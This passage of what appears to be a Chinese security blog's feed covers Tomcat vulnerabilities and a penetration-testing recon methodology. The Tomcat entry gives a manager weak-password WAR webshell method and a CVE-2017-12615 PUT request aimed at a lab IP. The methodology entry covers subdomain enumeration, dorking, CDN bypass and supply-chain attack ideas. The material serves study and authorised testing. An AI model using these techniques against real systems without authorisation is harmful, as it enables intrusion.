src="/../images/image-20230512151453267-1686840019399.png" alt="image-20230512151453267"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li>CSP</li><li>html实体编码，黑名单，转义字符</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat漏洞</title>
      <link href="/2023/06/01/Java%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/06/01/Java%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用Vulhub</p><p>空间搜索引擎</p><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><img src="/../images/image-20230228234754791-1686995572132.png" alt="image-20230228234754791"></p><p>webapps</p><p><img src="/../images/image-20230617184342638.png" alt="image-20230617184342638"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. bin目录: 存放一些二进制的文件，例如Tomcat常用的 启动脚本: startup.bat或startup.sh 关闭脚本: shutdown.bat 或 shutdown.sh等等</span><br><span class="line"></span><br><span class="line">2. conf目录: 存放的是Tomcat的配置文件</span><br><span class="line"></span><br><span class="line">server.xml可以设置端口号、设置域名或IP、默认加载的项目、请求编码</span><br><span class="line">web.xml可以设置tomcat支持的文件类型</span><br><span class="line">context.xml可以用来配置数据源之类的</span><br><span class="line">tomcat-users.xml用来配置管理tomcat的用户与权限</span><br><span class="line">Catalina目录下可以设置默认加载的项目</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. lib目录: 存放的是全局的jar包</span><br><span class="line"></span><br><span class="line">4. logs目录: 存放的是Tomcat的日志，如果Tomcat出错什么的，就需要在这里的日志中查找问题</span><br><span class="line"></span><br><span class="line">5. temp目录: 存放的是临时性的文件</span><br><span class="line"></span><br><span class="line">6. webapps目录: 存放的是Java的Web项目，要部署的项目就需要放在这个目录当中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7. work目录: 存放的是由JSP代码翻译的Java代码，以及编译的.class文件</span><br></pre></td></tr></table></figure><h2 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;Apache Tomcat&quot;</span><br><span class="line">server=&quot;Tomcat&quot; </span><br><span class="line"></span><br><span class="line">版本号：在Tomcat后面添加/x.x</span><br></pre></td></tr></table></figure><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="manager弱口令-部署war包getshell"><a href="#manager弱口令-部署war包getshell" class="headerlink" title="manager弱口令+部署war包getshell"></a>manager弱口令+部署war包getshell</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>全版本</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><blockquote><p>conf&#x2F;tomcat-users.xml中保存了登录凭证，导致可能存在弱口令漏洞，从而能访问Manager APP上传后门。</p></blockquote><p><img src="/../images/image-20230228232924268-1686995572133.png" alt="image-20230228232924268"></p><p>进入manager界面后可以部署war包</p><p>​<img src="/../images/image-20230228232939975-1686995572134.png" alt="image-20230228232939975"></p><blockquote><p>war包为jsp压缩文件（<code>jar cvf xxx.jsp</code>），Tomcat会自动解压，</p><p>如将shell.jsp打包为shell.war，Tomcat会将其解压为&#x2F;shell&#x2F;shell.jsp</p></blockquote><p><img src="/../images/image-20230228233506559-1686995572134.png" alt="image-20230228233506559"></p><p>修复：删除manage目录，配置文件修改</p><h3 id="put任意文件上传（CVE-2017-12615）"><a href="#put任意文件上传（CVE-2017-12615）" class="headerlink" title="put任意文件上传（CVE-2017-12615）"></a>put任意文件上传（CVE-2017-12615）</h3><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>全版本</p><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p><img src="/../images/image-20230617180921893.png" alt="image-20230617180921893"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.jsp/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.174.129:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>693</span><br><span class="line"></span><br><span class="line"><span class="language-dockerfile"><span class="keyword">shell</span></span></span><br></pre></td></tr></table></figure><p>需要在结尾加上<code>/</code>来绕过对<code>.jsp</code>的过滤，或者使用其他的系统文件名特性</p><h3 id="AJP文件包含-x2F-读取–Ghostcat幽灵猫（CVE-2020-1938）"><a href="#AJP文件包含-x2F-读取–Ghostcat幽灵猫（CVE-2020-1938）" class="headerlink" title="AJP文件包含&#x2F;读取–Ghostcat幽灵猫（CVE-2020-1938）"></a>AJP文件包含&#x2F;读取–Ghostcat幽灵猫（CVE-2020-1938）</h3><h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><p><img src="/../images/image-20230617182333230.png" alt="image-20230617182333230"></p><h4 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h4><p>漏洞原理：</p><p><a href="https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg">https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg</a></p><p>脚本：</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p><strong>python2运行</strong></p><p><strong>可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件</strong></p><p><img src="/../images/image-20230617184142564.png" alt="image-20230617184142564"></p><p><img src="/../images/image-20230617184129890.png" alt="image-20230617184129890"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试流程</title>
      <link href="/2023/06/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/06/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h1><p><img src="/../images/1550719703_5c6e1ad700bb6-1685533751883.png!small" alt="图片.png"></p><p>​<a href="https://www.freebuf.com/column/196291.html">渗透测试的8个步骤 - FreeBuf网络安全行业门户</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明确目标：与客户交流，得到渗透的范围，规则和需求</span><br><span class="line">信息收集：资产收集+敏感信息收集+指纹识别</span><br><span class="line">漏洞探测和信息分析：漏洞探测与利用</span><br><span class="line">获取所需：后渗透</span><br><span class="line">信息整理和形成报告：产出报告</span><br></pre></td></tr></table></figure><h1 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h1><h2 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h2><p><strong>尽可能的扩大攻击面</strong></p><h2 id="主域名收集"><a href="#主域名收集" class="headerlink" title="主域名收集"></a>主域名收集</h2><h3 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h3><ul><li><p>是什么</p><p>ICP备案是指网站在信息产业部提交网站信息进行官方认可。</p><p>所以国内使用国内服务器的网站，都必须要先办理ICP备案后才可以上线。</p></li><li><p>有什么用</p><p>通过查询目标企业的备案信息，可直接获取到目标企业注册了哪些域名，从而增加可渗透的目标范围。</p></li><li><p>在线查询</p><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统</a></p><p><a href="https://www.gsxt.gov.cn/index.html">国家企业信用信息公示系统</a></p><p><a href="https://www.qcc.com/">企查查 </a></p><p><a href="https://www.tianyancha.com/">天眼查</a></p></li><li><p>工具</p><p><a href="https://github.com/1in9e/icp-domains">1in9e&#x2F;icp-domains: 输入一个域名，输出ICP备案所有关联域名</a></p></li></ul><h3 id="WhoIs"><a href="#WhoIs" class="headerlink" title="WhoIs"></a>WhoIs</h3><ul><li><p>是什么</p><p><code>WHOIS</code>是用来查询互联网中域名的IP以及所有者等信息的传输协议。</p></li><li><p>有什么用</p><p>通过查询目标的WHOIS信息，可以对联系人、联系邮箱等信息进行反查，可以获取更多相关的域名信息。</p></li><li><p>在线查询</p><p><a href="https://whois.chinaz.com/">域名Whois查询 - 站长之家</a></p><p><a href="http://whois.bugscaner.com/">在线域名Whois查询,网站Whois反查-在线站长工具 bugscaner</a></p><p><a href="https://who.is/">WHOIS Search, Domain Name, Website, and IP Tools - Who.is</a></p></li></ul><h3 id="股权信息"><a href="#股权信息" class="headerlink" title="股权信息"></a>股权信息</h3><ul><li><p>是什么，有什么用</p><p>通过查询股权信息，或者股权穿透图，寻找子公司和孙公司等，一般对外投资超过50%或者有行政权限的都可以算目标</p></li><li><p>查询网站</p><p><a href="https://www.qcc.com/">企查查 </a></p><p><a href="https://www.tianyancha.com/">天眼查</a></p></li></ul><h3 id="其他应用中的域名-x2F-IP"><a href="#其他应用中的域名-x2F-IP" class="headerlink" title="其他应用中的域名&#x2F;IP"></a>其他应用中的域名&#x2F;IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">微信/支付宝小程序</span><br><span class="line">微信公众号</span><br><span class="line">手机APP：抓包，历史版本</span><br></pre></td></tr></table></figure><h3 id="DNS共享记录查询"><a href="#DNS共享记录查询" class="headerlink" title="DNS共享记录查询"></a>DNS共享记录查询</h3><ul><li><p>原理</p><p>查询共享DNS服务器的主机来获取到相关的域名</p></li><li><p>步骤</p><ol><li><p>首先查询目标是否存在自建的NS服务器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>将非权威应答中的ns服务器带到下面的网站查询</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">Find all Hosts pointing to DNS Server</a></p></li></ol></li></ul><h3 id="网络空间测绘"><a href="#网络空间测绘" class="headerlink" title="网络空间测绘"></a>网络空间测绘</h3><p>多用几个网络空间搜索引擎</p><p>FoFa语法</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">title=&quot;&quot;  # 标题   </span><br><span class="line">title=&quot;Directory listing for /&quot; # 目录遍历</span><br><span class="line">tile=&quot;outlook&quot; / &quot;tomcat&quot; / &quot;weblogic&quot;  # 查找特定应用</span><br><span class="line">server=&quot;WebSockify Python&quot; &amp;&amp; title=&quot;Directory listing for /&quot;  # 查找novnc（novnc运行在容器里）</span><br><span class="line"></span><br><span class="line">header=xxx # 请求头  感觉hunter的多</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cert=英文缩写   # 证书内容</span><br><span class="line">cert.subject=英文缩写 # 证书持有者</span><br><span class="line">cert.issuer=英文缩写 # 证书颁发者</span><br><span class="line"></span><br><span class="line">body=xxx  # 页面内容</span><br><span class="line"></span><br><span class="line">is_honeypot=false 排除蜜罐数据，仅限FOFA高级会员使用</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">模糊搜索 仅限个人版及以上或消耗F点使用</span></span><br><span class="line">= → *= 表示使用模糊搜索功能</span><br><span class="line">* 表示匹配的数量不受限制，可以用来代替 0 个、1 个或多个字符</span><br><span class="line">? 仅仅可替代 1 个字符</span><br><span class="line"></span><br><span class="line">https://github.com/FofaInfo/Awesome-FOFA/blob/main/Basic%20scenario/Basic%20scenario_ZH/FOFA%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF.md</span><br></pre></td></tr></table></figure><h3 id="供应链公司"><a href="#供应链公司" class="headerlink" title="供应链公司"></a>供应链公司</h3><p><a href="https://xz.aliyun.com/t/10531">记一次通过供应链拿到目标后台权限的过程 - 先知社区</a></p><p><a href="https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg">https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg</a></p><ul><li><p>为什么</p><p>试想一下，目标使用供应商提供的软件，那么这些软件是受到信任的。</p><p>所以我们可以通过攻击供应商，并在软件中植入恶意代码，这样目标在运行软件时也会运行恶意代码，从而达到攻击。</p><p>并且供应商保存了目标的各种信息。</p></li><li><p>手段</p><ul><li>网站页底的备案，版权信息<img src="/../images/image-20230511130314346-1685533751887.png" alt="image-20230511130314346"></li><li>招标文件</li></ul></li></ul><h3 id="聚合工具"><a href="#聚合工具" class="headerlink" title="聚合工具"></a>聚合工具</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><blockquote><p>一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。</p></blockquote><p><img src="/../images/ENScanGo-1685533751887.png" alt="ENScanGo"></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><h3 id="枚举爆破"><a href="#枚举爆破" class="headerlink" title="枚举爆破"></a>枚举爆破</h3><ul><li><p>原理</p><p>通过不断的拼接字典中的子域名前缀去枚举域名的A记录，再对其进行验证，但是该方法一般需要解决泛解析问题。</p></li><li><p>在线网站</p><p><a href="http://z.zcjun.com/">在线子域名爆破-子成君提供</a></p></li></ul><h3 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h3><ul><li><p>是什么</p><p>证书透明性（Certificate Transparency，CT）是 Google 的公开项目，通过让域所有者、CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁。</p></li><li><p>有什么用</p><p>因为是公开的，所以任何人都可以访问到其中的CA 证书，包含了域名、子域名、邮箱等敏感信息。</p></li><li><p>在线查询</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p><a href="https://search.censys.io/">Censys Search</a></p></li></ul><h3 id="DNS公开数据集"><a href="#DNS公开数据集" class="headerlink" title="DNS公开数据集"></a>DNS公开数据集</h3><p>利用已有公开的扫描数据集，对子域名信息进行收集。</p><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p><h3 id="DNS-域传送"><a href="#DNS-域传送" class="headerlink" title="DNS 域传送"></a>DNS 域传送</h3><ul><li><p>是什么</p><p>DNS服务器分为主服务器，备份服务器，缓存服务器。</p><p><strong>域传送</strong>是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。</p></li><li><p>有什么用</p><p>若 DNS 服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者。</p></li><li><p>检测方法</p><ul><li><p>dig请求</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到NS服务器</span></span><br><span class="line">dig [domain] ns</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送axfr请求</span></span><br><span class="line">dig axfr @[ns] [domain]</span><br></pre></td></tr></table></figure></li><li><p>nmap脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain]</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><ul><li><p>传统搜索引擎</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: xxx.com -xxx (-xxx 排除哪些子域)</span><br></pre></td></tr></table></figure></li><li><p>网络空间测绘</p><p><a href="https://fofa.info/">fofa</a></p><p><a href="https://hunter.qianxin.com/">鹰图平台</a></p></li></ul><h3 id="第三方在线平台"><a href="#第三方在线平台" class="headerlink" title="第三方在线平台"></a>第三方在线平台</h3><ul><li><p><a href="https://securitytrails.com(ui好看,结果最多)/">https://securitytrails.com（UI好看，结果最多）</a></p></li><li><p><a href="https://dnsdumpster.com/">DNSdumpster.com </a></p></li><li><p><a href="https://rapiddns.io/">https://rapiddns.io/</a></p></li></ul><h3 id="聚合工具-1"><a href="#聚合工具-1" class="headerlink" title="聚合工具"></a>聚合工具</h3><h4 id="收集工具"><a href="#收集工具" class="headerlink" title="收集工具"></a>收集工具</h4><ul><li><p><code>OneForAll</code></p><blockquote><p>一条龙，需要配置api，配合代理使用效果更佳</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target domain run</span><br><span class="line">python oneforall.py --targets domain.txt run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230508203149442-1685533751888.png" alt="image-20230508203149442"></p></li><li><p><code>Amass</code></p><p>感觉速度慢</p><p>手册：<a href="https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md">https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md</a></p><p>domain可视化</p><p><img src="/../images/maltego_results-1685533751888.png" alt="Maltego results"></p></li><li><p><code>ksubdomain</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ksubdomain -d seebug.org -full -summary</span><br></pre></td></tr></table></figure></li><li><p><code>subfinder</code> </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">subfinder -silent -d hackerone.com </span><br></pre></td></tr></table></figure></li></ul><h4 id="探活工具"><a href="#探活工具" class="headerlink" title="探活工具"></a>探活工具</h4><ul><li><code>httpx</code></li></ul><p>联动</p><ul><li>subfinder 通过各种搜索引擎获取域名</li><li>ksubdomain 验证域名</li><li>httpx http请求获得数据,验证存活</li></ul><p><img src="/../images/image-20230508205053563-1685533751888.png" alt="image-20230508205053563"></p><h2 id="IP段信息收集"><a href="#IP段信息收集" class="headerlink" title="IP段信息收集"></a>IP段信息收集</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h4 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h4><h5 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h5><p>如果没有使用CDN，则只会显示一个IP地址。</p><ul><li><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a>（国内+国外）</li><li><a href="https://www.host-tracker.com/v3/check/">https://www.host-tracker.com/v3/check/</a>  （国外）</li></ul><h5 id="nslookup法"><a href="#nslookup法" class="headerlink" title="nslookup法"></a>nslookup法</h5><ul><li><p>服务器名称</p><p><img src="/../images/image-20230509225424444-1685533751888.png" alt="image-20230509225424444"></p></li><li><p>同一个域名解析对应多个 IP 地址</p><p><img src="/../images/image-20230509225313449-1685533751888.png" alt="image-20230509225313449"></p></li></ul><h5 id="观察header"><a href="#观察header" class="headerlink" title="观察header"></a>观察header</h5><ul><li>观察请求响应的返回数据的头部，是否有 CDN 服务商标识</li><li>若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN<img src="/../images/image-20210901093608312-1685533751888.png" alt="image-20210901093608312"></li></ul><h5 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h5><p><a href="https://www.cdnplanet.com/tools/cdnfinder/">https://www.cdnplanet.com/tools/cdnfinder/</a></p><h4 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h4><p>[BYPASS-CDN&#x2F;CDN 2023 完全攻击指南（一）.md at main · bin-maker&#x2F;BYPASS-CDN · GitHub](<a href="https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN">https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN</a> 2023 完全攻击指南（一）.md)</p><h5 id="CDN费用"><a href="#CDN费用" class="headerlink" title="CDN费用"></a>CDN费用</h5><p>CDN 加速需要支付一定的费用，所以<strong>子站，国外</strong>很可能没有部署CDN。</p><h5 id="历史-DNS-记录"><a href="#历史-DNS-记录" class="headerlink" title="历史 DNS 记录"></a>历史 DNS 记录</h5><p><a href="https://viewdns.info/iphistory/?domain=www.baidu.com">IP History - ViewDNS.info</a></p><p><a href="https://x.threatbook.com/v5/domain/www.baidu.com?source=top">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a></p><h5 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h5><blockquote><p>用目标邮件服务器发送邮件给自己(QQ邮箱)再查看邮件源码一定情况下可以找到真实IP（服务端和我们建立连接）</p><p>这里还有一个<code>奇淫技巧</code>，通过发送邮件给一个不存在的邮箱地址，比如 <a href="mailto:000xxx@domain.com">000xxx@domain.com</a> ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。</p></blockquote><ul><li>RSS 订阅</li><li>邮箱注册、激活处</li><li>邮箱找回密码处</li><li>产品更新的邮件推送</li><li>某业务执行后发送的邮件通知</li><li>员工邮箱、邮件管理平台等入口处的忘记密码</li></ul><h5 id="virtual-host-碰撞"><a href="#virtual-host-碰撞" class="headerlink" title="virtual-host 碰撞"></a>virtual-host 碰撞</h5><p>原理：<a href="https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg">https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg</a></p><ul><li>当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。</li><li>在线收集工具 <a href="https://pentest-tools.com/information-gathering/find-virtual-hosts">https://pentest-tools.com/information-gathering/find-virtual-hosts</a></li></ul><h5 id="空间测绘引擎"><a href="#空间测绘引擎" class="headerlink" title="空间测绘引擎"></a>空间测绘引擎</h5><ul><li><p>favicon.ico 哈希特征</p></li><li><p>网页源码特征值</p><blockquote><p>在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。</p></blockquote></li></ul><h4 id="真实-IP-使用"><a href="#真实-IP-使用" class="headerlink" title="真实 IP 使用"></a>真实 IP 使用</h4><p>在获取到真实IP后，通过直接访问IP可能无法访问</p><ul><li><p>修改 hosts 文件</p></li><li><p>burpsuite 测试</p><p><img src="/../images/image-20230510181257028-1685533751888.png" alt="image-20230510181257028"></p></li></ul><h3 id="C段及端口扫描"><a href="#C段及端口扫描" class="headerlink" title="C段及端口扫描"></a>C段及端口扫描</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">masscan</span><br><span class="line">fscan </span><br><span class="line">fscan结果处理：</span><br><span class="line">https://github.com/ZororoZ/fscanOutput</span><br><span class="line"></span><br><span class="line">TXPortMap</span><br></pre></td></tr></table></figure><h4 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h4><p><a href="http://zhuabapa.top/2020/06/03/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">‘常用端口利用总结’ | zer0_c|imb’s blog</a></p><h1 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h1><h2 id="为什么-1"><a href="#为什么-1" class="headerlink" title="为什么"></a>为什么</h2><ul><li><p>运气好，一步到位</p></li><li><p>制作有针对性的弱口令字典</p></li><li><p>🎣</p></li></ul><h2 id="搜索引擎-1"><a href="#搜索引擎-1" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><ul><li><p>针对信息泄露的在线网站</p><ul><li><p><a href="https://leakix.net/">LeakIX</a></p></li><li><p><a href="https://intelx.io/">https://intelx.io/</a></p></li><li><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p></li><li><p><a href="https://aleph.occrp.org/">https://aleph.occrp.org/</a></p></li><li><p><a href="https://dehashed.com/">https://dehashed.com/</a></p></li></ul></li><li><p><code>Google Hacking</code></p><ul><li><p>常用语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com  账号 | 密码 | 工号 | 学号 | 身份证 | 公示 | 邮箱</span><br></pre></td></tr></table></figure></li><li><p>工具</p><p><a href="https://github.com/dwisiswant0/go-dork">https://github.com/dwisiswant0/go-dork</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\go-dork.exe -q &quot;[语法]&quot; -p [页面数量] -x http://127.0.0.1:33210 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一页10个数据</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-e 指定引擎 测试了只有google可以</span><br><span class="line">Google, Shodan, Bing, Duck, Yahoo, Ask</span><br></pre></td></tr></table></figure><p>​<img src="/../images/image-20230510222146978-1685533751888.png" alt="image-20230510222146978"></p></li></ul></li></ul><p>​</p><ul><li><p>网站</p><p><a href="https://ght.se7ensec.cn/#">在线Google Hacking小工具</a></p><p><img src="/../images/image-20230509215656848-1685533751889.png" alt="image-20230509215656848"></p><p><a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon</a></p><p><img src="/../images/image-20230509151606375-1685533751889.png" alt="image-20230509151606375"></p></li></ul><h2 id="目录-x2F-文件扫描"><a href="#目录-x2F-文件扫描" class="headerlink" title="目录&#x2F;文件扫描"></a>目录&#x2F;文件扫描</h2><p><strong>取决于字典，需要积累字典</strong></p><ul><li><p>工具</p><ul><li><p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -c -w /path/to/wordlist -u https://target/FUZZ</span><br></pre></td></tr></table></figure><blockquote><p>在需要测试的地方加上FUZZ</p></blockquote></li><li><p><a href="https://github.com/lemonlove7/dirsearch_bypass403">https://github.com/lemonlove7/dirsearch_bypass403</a></p><blockquote><p>流程：dirsearch进行目录扫描—&gt;将所有403状态的目录进行保存–&gt;是否进行jsfind–&gt;是(进行js爬取url和域名，将爬取到的url进行状态码识别如果是403状态则进行保存)–&gt;进行403绕过 （不过jsfinder不建议使用，不如urlfinder好用）</p></blockquote></li><li><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p><blockquote><p><strong>BBScan</strong> 是一个高并发、轻量级的信息泄露扫描工具。</p></blockquote></li><li><p><a href="https://blog.csdn.net/qq_43427482/article/details/110008286">https://blog.csdn.net/qq_43427482/article/details/110008286</a></p><blockquote><p>敏感文件</p></blockquote></li></ul></li><li><p>字典</p><p>将工具内置字典和公开字典进行整合，然后自己在实际中遇到的再添加。</p></li></ul><h2 id="JS信息"><a href="#JS信息" class="headerlink" title="JS信息"></a>JS信息</h2><p>可能泄露接口，后台地址，密码等敏感信息</p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><ul><li><p>工具</p><p><code>Urlfinder</code>  （推荐）</p><p><code>JSfinder</code></p><p><a href="https://github.com/mickeystone/JSFinderPlus">https://github.com/mickeystone/JSFinderPlus</a></p></li><li><p>浏览器插件</p><p>熊猫头–<code>FindSomething</code></p></li></ul><h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><p><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><h2 id="代码托管平台"><a href="#代码托管平台" class="headerlink" title="代码托管平台"></a>代码托管平台</h2><ul><li><p>github</p><p>工具</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/damit5/gitdorks_go</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./gitdorks_go_amd_linux -gd ../Dorks/smalldorks.txt -nws 20 -target gm7.org -tf ../tokenFile/tf.txt -ew 3</span><br></pre></td></tr></table></figure><blockquote><p><code>./tokenFile/tf.txt</code> → <code>Github access token</code></p><p><code>../Dorks/smalldorks.txt</code> →  <code>关键字字典</code></p></blockquote></li><li><p>GitLab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></p></li><li><p>gitee: <a href="https://gitee.com/">https://gitee.com/</a></p></li></ul><h2 id="招聘信息"><a href="#招聘信息" class="headerlink" title="招聘信息"></a>招聘信息</h2><p>可以通过该公司的招聘岗位信息，分析其技术栈，得到对方网站的架构。</p><h2 id="网盘信息"><a href="#网盘信息" class="headerlink" title="网盘信息"></a>网盘信息</h2><p>聚合网站：<a href="https://www.chaonengsou.com/">超能搜 - 百度网盘搜索神器</a></p><h2 id="历史漏洞"><a 